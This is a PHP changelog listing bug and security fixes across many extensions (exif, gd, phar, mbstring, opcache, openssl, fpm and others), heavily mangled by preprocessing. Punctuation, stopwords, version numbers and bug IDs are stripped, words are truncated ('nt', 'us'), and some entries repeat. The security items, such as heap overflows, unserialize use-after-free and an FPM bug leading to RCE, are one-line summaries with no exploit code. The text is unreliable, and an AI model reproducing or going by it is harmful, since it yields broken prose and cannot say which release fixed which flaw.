float number exponent part compatibility version fixed bug mysqligetclientinfo reflection info add support extension name argument dl fixed bug uniqid without moreentropy performs badly fixed bug heapuseafterfree unserializing invalid array size fixed bug denial service vulnerability found performing deserialization fixed bug mtrand bias machine fixed bug always throw nul end stream default sslsingledhuse sslhonorcipherorder true xml moved standard extension xmlrpc use zend mm allocation bundled libxmlrpc joe zip add support encrypted archive use bundled libzip deprecated withlibzip option recommended fixed bug reflection ziparchive show public property ziparchive implement countable added ziparchive count method fix segfault phpstreamcontextgetoption call fixed bug new method setencryptionname seems exist ziparchive zlib expose inflategetstatus inflategetreadlen function version oct fpm fixed bug envpathinfo underflow fpmmainc lead rce version aug mbstring fixed nt allow different encoding onignewdeluxe stas pcre fixed bug heap useafterfree pcrelib cmb version aug sqlite upgraded sqlite exif fixed bug heapbufferoverflow exifprocessusercomment fixed bug heapbufferoverflow exifscanthumbnail phar fixed bug potential uaf phar rshutdown version may exif fixed bug heapbufferoverflow gd fixed bug uninitialized read gdimagecreatefromxbm iconv fixed bug outofbounds read iconvc phpiconvmimedecode due integer overflow sqlite fixed bug bypassing openbasedir restriction via file uris version may exif fixed bug heapbufferoverflow estrndup via exifprocessifdtag mail fixed bug potential heap corruption tsendmail version apr exif fixed bug heapbufferoverflow fixed bug heapbufferoverflow exifiifaddvalue added ini directive version mar core fixed bug rename across device may allow unwanted access processing exif fixed bug uninitialized read exifprocessifdintiff fixed bug invalid read exifprocesssofn fixed bug uninitialized read exifprocessifdinmakernote fixed bug uninitialized read exifprocessifdinmakernote phar fixed bug null pointer dereference pharcreateorparsefilename fixed bug phartarwriteheadersint buffer overflow spl fixed bug openfile silently truncates null byte version jan core fixed bug memcpy negative length via crafted dns response gd fixed bug efree uninitialized heap data imagescale lead useafterfree fixed bug imagecolormatch bound write heap imap fixed bug null pointer dereference imapmail mbstring fixed bug buffer overflow mb regex function fetchtoken fixed bug heap buffer overflow mb regex function compilestringnode fixed bug heap buffer overflow multibyte matchat fixed bug heap buffer overflow due incorrect length expandcasefoldstring fixed bug buffer overflow fetchtoken fixed bug buffer overflow multibyte case folding unicode fixed bug heap overflow phar fixed bug heap buffer overflow phardetectpharfnameext xmlrpc fixed bug heap bound read xmlrpcdecode fixed bug global bound read xmlrpc code version dec core fixed bug zendsignalstartup need zendapi fixed bug segfault using convertquotedprintableencode filter ftp fixed bug ftpclose sslread shutdown iconv fixed bug fixing ignored iconvmimedecodecontinueonerror imap fixed bug imapopen allows run arbitrary shell command via mailbox parameter odbc fixed bug odbcfetchobject incorrect type signature opcache fixed bug type inference opcache cause side effect phar fixed bug phardata always creates new file mode fixed bug heap buffer overflow read pharparsepharfile pgsql fixed bug pgconvert broken regex time without timezone data type soap fixed bug wsdlcachememory cause segmentation fault fixed bug signedness issue soap socket fixed bug validate length socketwrite version nov core fixed bug cyclic reference generator detected fixed bug phpize configure create redundant deps file fixed bug buildconf output error message stderr mizunashi mana date fixed bug year component overflow date format c r fcgi fixed bug failed shutdownreboot end session window fixed bug apacheresponseheaders remove last character header name ftp fixed bug data truncation due forceful ssl socket shutdown intl fixed bug uargumenttypemismatch standard fixed bug iniscannerraw nt strip trailing whitespace tidy fixed bug tidy getoptdoc available window xml fixed bug xmlparseintostruct resolve entity add support getting skiptagstart skipwhite option version oct core fixed bug methodexists spl iterator passthrough method corrupts memory fixed bug segfault shutdown function memory limit error curl fixed bug use curlmultiwait timeouts respected iconv fixed bug iconvmimeencode qencoding longer opcache fixed bug zendopcachememorybase periodically deleted o posix fixed bug posixgetgrnam fails print detail group reflection fixed bug wrong exception thrown using reflectionmethod standard fixed bug wrong error message fopen ftp wrapped fails open data connection fixed bug bindto work filegetcontents fails streamsocketclient fixed bug arrayreduce slow carry large array zlib fixed bug phpzlibinflatefilter may update bytesconsumed version sep core fixed bug parent private constant extends class memory leak fixed bug generate enabled extension fixed bug x due header transferencoding chunked fixed arginfo bzcompress gettext fixed bug incorrect restoring ldflags iconv fixed bug iconvmimedecode return extra character header fixed bug iconvmimedecodeheaders function skipping header fixed bug iconvmimedecode ignore special character fixed bug iconvmimedecodeheaders skip header intl fixed bug messageformatter formatmessage memory corruption named placeholder libxml fixed bug public id parameter libxmlsetexternalentityloader callback undefined mbstring fixed bug mbdetectorder return value varies based argument type opcache fixed bug opcache treat path containing testpharmatld phar file openssl fixed bug unusable ssl peerfingerprint streamcontextcreate phpdbg fixed bug phpdbg man page contains outdated information spl fixed bug exception directoryiterator getlinktarget fixed bug regexiterator pregflags null instead standard fixed bug arrayreduce leak memory callback throw exception zlib fixed bug zlib version check fails includezlib style dir passed withzlib configure option fixed bug minimal required zlib library version aug calendar fixed bug jewishc compile error window gbk charset filter fixed bug reference subarray filtering break filter pdofirebird fixed bug memory leak fetching blob field pdopgsql fixed bug possible memory leak using pdo cursorscroll option fixed bug bindvalue nt juggle standard fixed bug arraycolumn null value indexkey become incrementing key result fixed bug incorrect entry gethtmltranslationtable fixed bug segmentation fault using outputaddrewritevar zip fixed bug ziparchive memory leak overwrite flag empty archive version jul core fixed bug php hang illegal string offset string reference error handler fixed bug chain mixed exception error serialize properly date fixed bug undefined property dateinterval f exif fixed bug int overflow lead heap overflow exifthumbnailextract exifc fixed bug heapbufferoverflow read size reading exif data fpm fixed bug vulnerability phpfpm changing stdin nonblocking gmp fixed bug integer underflow unserializing gmp possible class intl fixed bug getdebuginfo handler breakiterator show wrong type mbstring fixed bug integer overflow excessive memory usage mbstrimwidth pgsql fixed bug pgfetchresult fetch next row phpdbg fix arginfo wrt optionalrequired parameter reflection fixed bug php crash core dump throwing exception error handler fixed bug reflectionproperty getvalue incorrectly work inherited class standard fixed bug arraymergerecursive duplicating subarray key fixed bug getimagesize imageinfo return false fixed bug window linkinfo lack openbasedir check version jun cli server fixed bug php builtin server find file root path contains special character openssl fixed bug opensslpkeygetpublic respect openbasedir fixed bug openssl extension fails build libressl spl fixed bug norewinditerator segfault standard fixed bug link bad file descriptor nonascii path fixed bug arraymap globals return isindirect version may fpm fixed bug withfpmacl wrongly try find libacl freebsd intl fixed bug locale parselocale broken argument opcache fixed bug phpfpm sporadic crash running infinitewp fixed bug assertion failure file cache unserializing empty trycatcharray fixed bug opcache cause incorrect undefined variable error reflection fixed arginfo arrayreplace recursive arraymerge recursive version apr date fixed bug mismatch arginfo datecreate exif fixed bug heap buffer overflow read exifiifaddvalue fpm fixed bug error failed reload execvp failed argument list long fixed incorrect write getenv result fpm reload gd fixed bug imagedashedline dashed line sometimes visible iconv fixed bug stream filter converticonv lead infinite loop invalid sequence intl fixed bug intl compilation fails ldap fixed bug malicious ldapserver response cause crash mbstring fixed bug wrong detection fixed bug mbstring build oniguruma phar fixed bug fix may complete phpdbg fixed bug memory corruption arbitrary nul overwrite spl fixed bug mismatch arginfo splarray constructor standard fixed bug incorrect url header mtrand version mar core fixed bug segfault throwing exception errorhandler fixed bug date illegal option configure freebsd fpm fixed bug dumpable fpm child process allow bypassing opcache access control gd fixed bug signed integer conversion imagescale odbc fixed bug odbc function available default window opcache fixed bug opcache corrupts variable forloop phar fixed bug segmentation fault buildfromiterator directory name contains n standard fixed bug mailaddxheader default inconsistent doc fixed bug parseinistring fails parse foo baz segfault version mar fixed bug simple way segfaults threadsafe php configuration date fixed bug timezone get truncated formatted fixed bug argument datetimezone listidentifiers accept null fixed bug calling vardump datetimezone object modifies pgsql fixed memory leak pgescapebytea odbc fixed bug unable retrieve value varchar max type ldap fixed bug fix ldap path lookup distros fixed bug use pkgconfig available phar fixed bug deal leading slash adding file correctly spl fixed bug strange behavior appenditerator standard fixed bug dnscaa record result contain garbage fixed bug stackbufferoverflow parsing http response version feb core fixed bug path character problem fixed bug segfault using spread operator generator passed reference fixed bug arg getdefinedfunctions optional fixed bug exit inside generator finally result fatal error fixed bug self keyword lead incorrectly generated typeerror closure trait fcgi fixed bug getenv crash window second parameter false imap fixed bug imapappend heapcorruction opcache fixed bug file cache populated shm run full fixed bug interned string buffer overflow may cause crash pgsql fixed bug pgversion crash called connection cockroach readline fixed bug readlinereadhistory segfaults empty file sapi fixed bug embed sapi segmentation fault sapiregisterpostentry soap fixed bug soapclient generates eerror even used fixed bug segmentation fault zendstringrelease spl fixed bug recursivearrayiterator traverse array reference fixed bug recursivearrayiterator nt constant parent class fixed bug recursivearrayiterator iterate object property standard fixed bug substrcount incorrect result version jan core fixed bug segmentation fault fixed bug php seems incompatible onedrive file demand fixed bug unable clone instance private clone defined fixed bug phpprocess crash isfile used string longer char cli server fixed bug random invalid request unexpected eof using router script fixed bug directory exist fpm fixed bug libxmldisableentityloader setting shared request gd fixed bug potential infinite loop gdimagecreatefromgifctx opcache fixed bug narrowing occurred type inference error fixed bug interned string buffer overflow may cause crash fixed bug narrowing occurred type inference error pcre fixed bug preglasterror returning error code error phar fixed bug reflected x phar page standard fixed bug fread free unused buffer fixed bug mtrand return value outside min max remi fixed bug inappropriately parsing http response lead php segment fault fixed bug accept efault addition enosys indicator getrandom missing fixed bug phpiniscannedfiles reporting correctly fixed bug putenv work properly parameter contains nonascii unicode character zip fixed bug segfault libzip version nov core fixed bug crash modifing property name isset bpvaris fixed bug mmapmunmap trashing unlucky allocation cli fixed bug builtin webserver crash chdir shutdown function enchant fixed bug enchantbrokergetpath crash path set fixed bug enchant still report version exif fixed bug exif extension built revision version gd fixed bug imagerotate may alter image dimension fixed bug wrong reflection imagewebp intl fixed bug uconverter setdestinationencoding change source instead destination interbase fixed bug incorrect reflection ibase p connect mysqli fixed bug wrong reflection mysqlifetchall function openssl fixed bug leak memory fixed bug wrong reflection opensslopen function opcache fixed bug warning internal error wrong size calculation pgsql fixed bug default link incorrectly clearedlinked pgclose soap fixed bug wrong reflection soapclient setsoapheaders zlib fixed bug wrong reflection inflateinit inflateadd version oct core fixed bug null pointer dereference zendmmallocsmall fixed bug infinite loop printing errormessage fixed bug incorrect token formatting two parse error one request fixed bug segfault calling iscallable parent fixed bug debug info closure internal function contain garbage argument name date fixed bug outofbounds read timelibmeridian fixed bug error zendhashkey member named arkey hash fixed bug hang bigendian intl fixed bug parameter uconverter getaliases optional litespeed fixed bug binary directory nt get created building litespeed sapi fixed bug missing program prefix suffix mcrypt fixed bug arcfour encryption stream filter crash php mysqli fixed bug data corruption reading field bit type fixed incorrect reference counting opcache fixed bug request hang finish pcre fixed bug applied upstream patch pdomysql fixed bug type bit fetched unexpected string spl fixed bug spldoublylinkedlist setiteratormode mask intern flag version sep core fixed bug runtestsphp issue extension block bcmath fixed bug bcpowmod fails scale fixed bug bc math handle minus zero incorrectly fixed bug bcpowmod may return modulus fixed bug bcpowmod misbehaves noninteger base modulus cli server fixed bug builtin server truncates header spanning tcp packet curl fixed bug openssl support detected gd fixed bug gdimagegrayscale may produce color fixed bug suspicious gettext fixed bug textdomain null throw strict mode intl fixed bug intlgregoriancalendar nt constant parent class fixed bug segfault collatorconvertobjecttostring pdooci fixed bug pdopco phpfpm oci environment initialized phpfpm set spl fixed bug appenditerator append broken appending another appenditerator fixed bug incorrect behavior appenditerator append foreach loop standard fixed bug signed integer overflow parseiv fixed bug gethostname fails host name char long version aug core fixed bug segfault scanner inf number fixed bug null deref segfault zendgeneratorresume fixed bug break unhandled exception fixed bug main cwd initialized wrong codepage fixed bug nan comparison curl fixed bug fixed finding curl system multiarch support date fixed bug null pointer dereference timelibtimeclone intl fixed bug wrong reflection locale function mbstring fixed bug segmentation fault mbstrcut htmlentities encoding fixed bug mbconvertkana convert iteration mark fixed bug wrong reflection mberegireplace mysqli fixed bug php crash calling mysqliresult fetchobject abstract class expose ociunregistertafcallback tianfang yang opcache fixed bug narrowing occurred type inference phar fixed bug includepath char limit case reflection fixed bug null pointer dereference functionstring session fixed bug url rewriting transsid working url start fixed bug sid constant created wrong module number simplexml fixed bug nullpointer deref simplexmlelementgetdocnamespaces spl fixed bug splautoloadunregister ca nt handle splautoloadfunctions result fixed bug unserialize arrayiterator broken fixed bug appending appenditerator lead segfault fixed bug crash recursive iterator destructors standard fixed bug unpack x cause infinity loop fixed bug heapuseafterfree unserializing invalid array size fixed bug denial service vulnerability found performing deserialization wddx fixed bug wddx us wrong decimal seperator xmlrpc fixed bug incorrect xmlrpc serialization class declared property version aug core fixed bug loading php extension already registered function name lead crash fixed bug parseurl broken query string contains colon fixed bug unary operator expected error system fixed bug use free unserialize splfixedarray fixed bug crash crawling network share fixed bug fixed incorrect pollh include fixed bug fixed incorrect errnoh include date fixed bug propertyexists return true unknown dateinterval property fixed bug integer overflow ocibindarraybyname opcache fixed bug infinite loop type inference using htmlpurifier openssl fixed bug work used content added openssldontzeropadkey constant prevent key padding fix bug opensslopen return junk envelope byte bug openssl blowfish encryption incorrect short key pdo fixed bug pdostatement debugdumpparams truncates query spl fixed bug php freeze appenditerator fixed bug construct produce memory exception invalid flag wddx fixed bug huge memleak wddxunserialize fixed bug wddx parsing empty boolean tag lead sigsegv zlib fixed bug dictionary option inflateinit work version jul core fixed bug multiple path host section properly parsed fixed bug undefined constant array property result broken property fixed misparsing abstract unix domain socket name fixed bug php ini parsing stack buffer overflow vulnerability fixed bug unserialize heap useafterfree read zvalgettype fixed bug heap buffer overread read finishnesteddata unserialize fixed bug wddxdeserialize heap outofbound read via phpparsedate date fixed bug implement clone dateperiod dateinterval dom fixed bug reference deleted xpath query result gd fixed bug buffer overread uninitialized memory intl fixed bug stack buffer overflow msgfmtparsemessage fixed bug wrong reflection collator getsortkey collatorgetsortkey mbstring add oniguruma upstream fix add taf callback pr opcache fixed bug segfault opcachememoryprotect validatetimestamp revert opcacheenablecli default disabled openssl fixed bug work used content fixed bug negativesizeparam memcpy zifopensslseal pdooci support instant client withpdooci configure option reflection fixed bug segfault cast reflection object string undefined constant spl fixed bug null coalescing operator failing splfixedarray ftp fixed bug ftp wrapper ignores context arg phar fixed bug phar construct reflection incorrect soap fixed bug incorrect conversion array wsdlcachememory stream fixed bug streamsocketgetname return version jun core fixed bug crash sigsegv zendhashaddorupdatei fixed bug sigill zendfetchclassconstantspecconstconst fixed bug dir wrong unicode character intl fixed bug wrong reflection collator sortwithsortkeys mysqli fixed bug mysqli changeuser nt accept null database argument wstricttypes opcache fixed bug sigsegv opcacherevalidatepath enabled phar fixed bug phar webphar handle request sent put delete method readline fixed bug readline move cursor beginning line standard fixed bug anchor cc header bcc xmlreader fixed bug wrong reflection xmlreader expand version may core fixed bug endless loop bypassing execution time limit fixed bug segfault killing within bash script trap code fixed bug magic function get different behavior php fixed bug null coalescing operator fails undeclared static class property fixed bug multiple catch freeze case fixed bug streamselect broken window nanoserver fixed bug phpcgiexe crash facebook callback date fixed bug wrong reflection datetimezone gettransitions fixed bug add constant format datetime dom fixed bug wrong reflection domnode clonenode fileinfo fixed bug syntax error compile error libmagicapprenticec gd fixed bug compile fails solaris system library mysqlnd fixed bug invalid free persistent result errorconnection loss intl fixed bug intl support datetimeimmutable fixed bug intldateformatter format nt return microsecondsfractions fixed bug wrong reflection normalizer method fixed bug wrong reflection locale method opcache fixed bug segmentation error running script cli mode fixed bug foreach infinite loop fixed bug opcached version produce nested array openssl fixed bug null character allowed opensslpkeygetprivate fixed bug segfault opensslpkeynew generating dsa dh key fixed bug fails parse utctime without second phar fixed bug phar method parameter reflection correction readline fixed bug readline immediately return false interactive console mode standard fixed bug setcookie allows maxage negative fixed bug compaction arrayrand violates cow stream fixed bug remote socket uri unique persistence identifier broken version apr core fixed bug static embed sapi linkage error fixed bug falsely exit memory using fixed bug leak instance method calling static method referenced return fixed bug resolution self foo class constant correct fixed bug build problem release undefined reference isfinite fixed bug yield fromlabel overgreedy apache reverted patch bug fix bug date fixed bug swatch time value incorrect date dom fixed bug libxmlnowarning flag ingnored loadhtml iconv fixed bug iconv fails fail surrogate opcache fixed bug opcache compilation performance regression php huge class openssl fixed bug fwrite nonblocking ssl socket nt work pdo mysql fixed bug expose mysqliclientssldontverifyservercert pdo interface spl fixed bug arrayobject notice change sqlite fixed bug allow creation deterministic sqlite function stream fixed bug correctly fail invalid ip address port zlib fixed bug deflateadd allocate much memory version mar core fixed bug segfault nested generator fixed bug php hang invalid value dynamically passed typehinted byref arg fixed bug maximum execution time second exceed written errorlog fixed bug php segfaults within symfony test suite fixed bug bound read zendmmallocsmall fixed bug performance problem processing large post request fixed bug arraykeyexists fails array created getobjectvars fixed bug nan check fails alpine linux musl fixed bug generating pharphar core dump gcc asan enabled build apache fixed bug incomplete post timeout passed php date fixed bug new datetime sometimes return second ago value fpm fixed bug phpfpm process accounting broken keepalive hash fixed bug gostcrypto hash incorrect input data contains long sequence gd fixed bug reflectionfunction imagepng missing last two parameter mysqlnd fixed bug fetcharray broken data data mediumblob opcache fixed bug segfault list openssl fixed bug php fast cgi crash reading pfx file fixed bug memory leak opensslencrypt standard fixed bug mailaddxheader cause rfcbreaking lone line feed fixed bug substrcount broken fixed bug iscallable callable name report misleading value anonymous class fixed bug php linux use devurandom getrandom available stream fixed bug invalid memory access zendinlinehashfunc fixed bug streamgetcontents maxlength return empty string version feb core improved generatorcreate opcode handler fixed bug readlink return garbage path fixed bug crash exporting expansion assign op fixed bug bug symlink related cyrillic directory fixed bug segfault debugprintbacktrace fixed bug arginfo incorrect unpack fixed bug assertion error debugzvaldump dom fixed bug getattributenodens nt get xmlns attribute dtrace fixed bug dtrace reported enabled disabled fcgi fixed bug phpcgi fails load c specified phpini file fixed bug phpfcgichildren included phpinfo fpm fixed bug phpfpm close stderr using syslog gd fixed bug premature failing xbm reading gmp fixed bug test gmph need test machine includes hash added hashhkdf function fixed bug environmental build dependency hash source intl fix bug link use cc instead cxx ldap fixed bug errorsegfault ldapmodreplace opcache mysqli fixed bug leak mysqlifetchobject mysqlnd fixed bug segfault close freeresult mysqlnd opcache fixed bug crash finish work phar cli opcache openssl fixed bug add serial hex return value array fixed bug compile extopenssl openssl win fixed bug openssldecrypt trigger bug pdo pdofirebird implemented fr data fetched string pdopgsql fixed bug lastinsertid fails throw exception wrong sequence name phar fixed bug phardata compress nt close temp file posix fixed bug configure script incorrectly check ttynamer session fixed bug session readable root cli spl fixed bug splautoload crash call magic call standard fixed bug closing fd incorrect pt enabled fixed bug soapclient stumble wsdl delivered transferencoding chunked fixed bug imap undefined service aix fixed bug moneyformat store wrong length aix fixed bug intval base detect binary fixed bug maillog syslog contains double information zip fixed bug ziparchive addglob ignores removeallpath option version jan core fixed bug invalid foreach loop hang script fixed bug adding settype ed value arrayobject result reference fixed bug invalid opcode occurs variable created list fixed bug zendmmbitsetlen undefined symbol zendbitseth fixed bug unserialized array pointer advancing fixed bug sigign nt work zend signal enabled fixed bug heap bound read unserialize finishnesteddata fixed bug null pointer dereference unserialize php object fixed bug use uninitialized memory unserialize fixed bug unserialize useafterfree resizing object property hash table cli fixed bug cli output japanese window com fixed bug dotnet read access violation using invalid codepage dom fixed bug getelementsbytagnamens filter default n exif fixed bug fpe parsing tag format gd fixed bug signed integer overflow gdioc fixed bug do vulnerability mbstring fixed bug mberegsearchinit null pointer dereference mysqli fixed bug persistent connection nt set connecterrno mysqlnd optimized handling bit field le memory copy lower memory usage fixed bug sporadic segfault mysqlioptintandfloatnative opcache fixed bug strange behavior class constant switchcase block fixed bug method return string return instead fixed bug segmentation fault zendcallfunction fixed bug sigfpe arithmetic exception opcache divide minus fixed bug recursion variable redefined array pdo firebird fixed bug pdofirebird firebird work returning statement phar fixed bug seg fault loading hostile phar fixed bug memory corruption loading hostile phar fixed bug crash loading hostile phar archive phpdbg fixed bug crash memory using run command separator fixed bug phpdbg show wrong line file shebang reverted fix fixed bug unsetting result set may reset result set standard fixed bug dnsgetrecord populate additional parameter fixed bug unserialize context shared double class lookup fixed bug serialize object sleep function crash fixed bug getbrowser function slow fixed bug loading browscapini startup cause high memory usage add subject mail log fixed bug getdefinedfunctions additional param exclude disabled function zlib fixed bug deflateadd verify output truncated version dec core added nullable type added dfa optimization framework based essa form added specialized opcode handler eg zendaddlongnooverflow added alternative construct list added void return type added support negative string offset string offset syntax various string function added form list construct key specified implemented safe execution timeout handling prevents random crash maximum execution time exceeded error implemented rfc support class constant visibility implemented rfc catching multiple exception type implemented logging syslog dynamic error level implemented fr support nmake test building extension phpize implemented rfc iterable implemented rfc closure fromcallable danack implemented rfc replace missing argument warning argumentcounterror exception implemented rfc fix inconsistent behavior variable fixed bug logging internal zend error missing class information missing class name fixed memory leak null coalescing operator spl hash fixed bug slow performance fetching large dataset mysqli pdo fixed bug use free vulnerability unserialize fixed bug ilegal writeread access caused gdimageaaline overflow fixed bug imagefilltoborder stackoverflow truecolor image fixed bug exception tostring cause circular reference fixed bug float nano nan fixed bug segfault clone exceptiontostring get fixed write bound numberformat fix pthreads detection crosscompiling ffontaine fixed bug trycatch working two exception inside operation fixed bug segfault undefined function fixed bug php hang error handler throw accessing undef const default value fixed bug parse error invalid numeric literal fixed bug parsestr without second argument lead crash fixed bug heap buffer overflow virtualpopen zendvirtualcwdc fixed bug crypt broken salt long fixed bug null pointer deref zvaldelrefp fixed bug assigndim string nt reset hval fixed bug reference lost arrayslice fixed bug bound global memory read bfcrypt triggered passwordverify fixed bug segfault get returned ref fixed bug php segfaults trying expand infinite operator typeerror message arginfo type check say must null parameter return type accepts null fixed bug streamsocketrecvfrom read access violation fixed bug create unexpected object nt invoke wakeup deserialization fixed bug php session data injection vulnerability fixed bug memory allocator fails realloc small block large one fixed url rewriter would rewrite examplecom url unconditionally url rewrite target host whitelist implemented fixed bug phpize window ignores phpprefix fixed bug getmxrr broken fixed bug caught exception assignment variable ignores reference fixed bug calling earlier instance included anonymous class fatals fixed bug previous property undefined exception deserialization fixed bug different reference behavior comparing php fixed bug verifyreturn type cast visible finally fixed bug return reference finally memory safe fixed bug wrong return value var modified finally fixed bug memory leak array altered destructor fixed bug memory error arr arr b rh rehash added new constant phpfdsetsize added optind parameter getopt added php sapi error severity mapping log fixed bug unable set enabledebug building extension phpize window fixed bug destructor called exception thrown constructor implemented rfc rng fix implemented email validation per rfc fixed bug stackbased buffer overflow vulnerability virtualfileex fixed bug httpproxy improperly trusted php library application fixed bug dtrace issue reflection failed test fixed bug strange reference recursive function call switch statement fixed bug segmentation fault rfc listkeys fixed bug list regression fixed bug typeerror generator function wdeclared return type finish fixed bug tempnam raise notice falling back temp dir fixed long path support window fixed bug assignment via string index access empty string convert array fixed bug exception leak temporary variable fixed bug possible stiffen child class member visibility fixed bug generator nt participate cycle gc fixed bug memleak return finally block fixed bug missing separation property ht foreach etc fixed bug aborted generator continue nested finally fixed bug string offset assignment empty string insert null byte fixed bug ascii delete control character permitted identifier fixed bug nested tryfinally block losing return value fixed bug finally leak nested exception fixed bug phpcgiexe missing uac manifest change statement fcall extension handler accept frame number operator taking numeric string emit enotices ewarnings given malformed numeric string int intval base unspecified settype decbin decoct dechex integer operator conversion always respect scientific notation numeric string raise compiletime warning octal escape sequence overflow enable permodule logging apache bcmath fix bug memcpy negative parameter bcnewnumex fixed bug integer overflow bzdecompress caused heap corruption fixed bug inadequate error handling bzread calendar fix integer overflow joshua rogers fixed bug caldaysmonth fails final month french calendar fixed bug addresssanitizer globalbufferoverflow zifcalfromjd cli server fixed bug unable work root unicode char fixed bug builtin webserver send date header com fixed bug pas parameter reference fixed bug invalid free extension trait fixed bug com called php return parameter fixed bug dotnetcom array parameter broke fixed bug variantdatefromtimestamp null dereference curl implement support handling server push add curlmultierrno curlshareerrno curlsharestrerror function fixed bug heap overflow curlescape fixed bug sizet overflow lead heap corruption stas fixed bug curlsetopt segfault empty curlopthttpheader fixed bug curlinfocertinfo data parsing error date fixed bug dateinterval property isset fixed bug createfromformat z format char result incorrect time fixed bug inconsistent behavior u format char fixed bug datetime parser nt set microsecond fixed bug microsecond missing datetime class fixed bug microsecond dateinterval missing fixed bug datetime createfromformat u u nuke microtime fixed bug allow datetime modification subsecond item fixed bug general datetime improvments needed microsecond become useful fixed bug timelibmeridian nt parse dot correctly fixed bug datetime constructor initialise microsecond property fixed bug use free unserialize fixed bug memcpy negative size parameter phpresolvepath fixed bug datetime createfromformat u pre date fails parsing invalid serialization data datetime dateperiod object throw instance error wakeup setstate instead resulting fatal error timezone initialization failure serialized data throw instance error wakeup setstate instead resulting fatal error export dategetinterfacece extension use fixed bug strtotime seems use sunday monday start week dba fixed bug fetch multiple value group ini file data modification function eg dbainsert throw instance error instead triggering catchable fatal error key contain exactly two element dom fixed bug missing null check domdocumentsavehtml fixed bug dom document dangling reference invalid schema relaxng validation context throw instance error instead resulting fatal error attempting register node class extend appropriate base class throw instance error instead resulting fatal error attempting read invalid write readonly property throw instance error instead resulting fatal error dtrace disabled php call tracing default make significant overhead may enabled using envirionment variable exif fixed bug samsung picture thumb read zero size fixed bug memory leakage exifprocessifdintiff fixed bug bound read exifprocessifdinmakernote fixed bug null pointer dereference exifprocessusercomment filter fixed bug bad filter flag filterflagnoresrange filterflagnoprivrange fixed bug default option ignored object passed int filter fixed bug filterflagnoresrange cover whole range fpm fixed bug using allowtorunasroot ignore missing user ftp fixed bug upload file using ftpput ftpes requiresslreuse implemented fr option ignore returned ftp pasv address gd fixed bug integer overflow imageline antialiasing fixed bug imagescale affected affect imagesetinterpolation fixed bug integer overflow gdimagescalebilinearpalette fixed bug stack buffer overflow gd dynamicgetbuf fixed bug imagettftext broken transparent background wo alphablending fixed bug integer overflow gdimagewebpctx gdwebpc fixed bug imagettfbbox give incorrect value bounding box fixed bug ignores param given fixed bug writes wrong chunk size boundary fixed bug unrecognized format may result corrupted file fixed bug may leak memory fixed bug imagetruecolortopalette white duplicated palette fixed bug imagecopy support transparency truecolor image fixed bug imagecopy loses singlecolor transparency palette image fixed bug possible resource leak phpimageconvert fixed bug imagesetstyle cause oob read empty style fixed bug selectcolors write outofbounds fixed bug imagegammacorrect allows arbitrary write access fixed bug imagetypes function wo nt advertise webp support fixed bug imagearc ignores thickness full arc fixed bug server error page fully rendered fixed bug broken transparency imagearc truecolor blendingmode fixed bug gdimagetruecolortopalettebody allows arbitrary writeread access fixed bug imagegifoutput outofbounds access fixed bug integer overflow error within gdcontributionsalloc fixed bug ilegal writeread access caused gdimageaaline overflow fixed bug imagecropauto outofbounds access fixed bug imagecreatefromjpeg fails selfie fixed bug thick styled line scrambled pattern fixed bug xbm image require width multiple fixed bug imagefilledpolygon nt draw horizontal line hash added fixed mode algorithm bit added algorithm iconv fixed bug iconvsubstr return false empty string imap fixed bug integer overflow phpimapmail lead crash email address longer byte throw instance error instead resulting fatal error interbase fixed bug fails find firebird header nt use fbconfig output intl fixed bug add locale length check fixed bug add mitigation icu int overflow fixed bug grapheme unicode compliant cr lf sequence fixed bug add locale length check fixed bug segfault instantiating class extends intlcalendar add property fixed bug locale lookup localelookup hang match found partially fixed idntoascii ut incorrect long domain name fixed bug localeacceptfromhttp outofbounds access failure call parent constructor class extending collator invoking parent method throw instance error instead resulting recoverable fatal error cloning transliterator object may throw instance error instead resulting fatal error cloning internal transliterator fails added intltimezone getwindowsid intltimezone getidforwindowsid fixed bug intldateformatter formatobject return wrong value fixed bug intldateformatter formatobject return wrong value time style none json introduced encoder struct instead global fix bug related pretty print indentation fixed bug segfault throwing jsonserializable implemented earlier return jsonencode fails fix bug stacking exception thrown jsonserializable recursion error jsonencode eat system memory implemented fr empty key object exported json parser api including jsonparsermethod used implementing custom logic parsing json escaped jsonunescapedunicode supplied jsonencode option added jsonunescapedlineterminators restore previous behaviour ldap providing unknown modification type ldapbatchmodify throw instance error instead resulting fatal error mbstring fixed bug null pointer dereference mberegi fixed bug mbconvertvariables detect recursion fixed bug mbstringinternalencoding nt inherit defaultcharset fixed bug mbsubstr take signed integer fixed bug mbereg clear regs parameter failure fixed bug mberegsearch raise warning match zerowidth fixed bug mberegsearch increment search position match zerowidth fixed bug mberegsearchsetpos accept string last position fixed bug mbereg cause buffer overflow regexp compile error deprecated mberegreplace eval option fixed bug mbereg reject illformed byte sequence fixed bug mberegreplace mbctocode oniguruma oob read access fixed bug useafterfree mbstring searchre mbereg mberegi throw instance parseerror invalid php expression provided e option used mcrypt deprecated extmcrypt fixed bug heap overflow due integer overflow fixed bug bug correct casting sizet int lead heap overflow mdecryptgeneric mcryptencrypt mcryptdecrypt throw instance error instead resulting fatal error mcrypt initialized mysqli attempting read invalid write readonly property throw instance error instead resulting fatal error mysqlnd fixed bug add missing mysqlnd parameter phpini fixed bug segfault explain unknown column error using mariadb fixed bug mysqligethostinfo wrong output fixed bug bind reference overwritten php fixed invalid handle error implicit result set fixed bug binding null value trigger error odbc fixed bug odbcerrormsg return trash always byte opcache fixed bug segfaults conditionally declared class function name fixed bug check cached file permission fixed bug memory leak zendaccelblacklistupdateregexp function fixed bug typo opcache error message fixed bug infinite loop parsing file opcache enabled fixed bug opcache restart killalllockers work openssl fixed bug opensslpkeynew generates wrong pubpriv key diffie hellman fixed bug crash opensslrandompseudobytes function fixed bug invalid path sniservercerts cause segfault fixed bug extopenssl build failure openssl bumped minimal version dropped support implemented fr add elliptic curve support openssl implemented fr added aead support ccm gcm mode opensslencrypt openssldecrypt implemented error storing global queue cleaning openssl error queue resolve bug pcntl implemented asynchronous signal handling without tick added pcntlsignalgethandler return current signal handler particular signal address fr add signinfo pcntlsignal handler args bishop bettini david walker pcre fixed bug segmentation fault pcrereplacecallback fixed bug preg may leak memory fixed bug useafterfree zend allocator management fixed bug bundled pcre nt compile jit nt supported fixed bug pregmatch missing group name match downgraded pcre fixed bug memleak jitstack fixed bug mail fails invalid argument upgraded pcre pdo fixed bug invalid memory access using persistent pdo connection fixed bug memory leak pdo persistent connection handling fixed bug call empty null result using pdo fetchlazy return false pdodblib fixed bug never quote value raw binary data allow pdo setattribute set query timeouts handle sqldecimalsqlnumeric type used later tds version add common pdo test suite free error message string cleaning pdo instance fixed bug pdostatement nextrowset succeed row 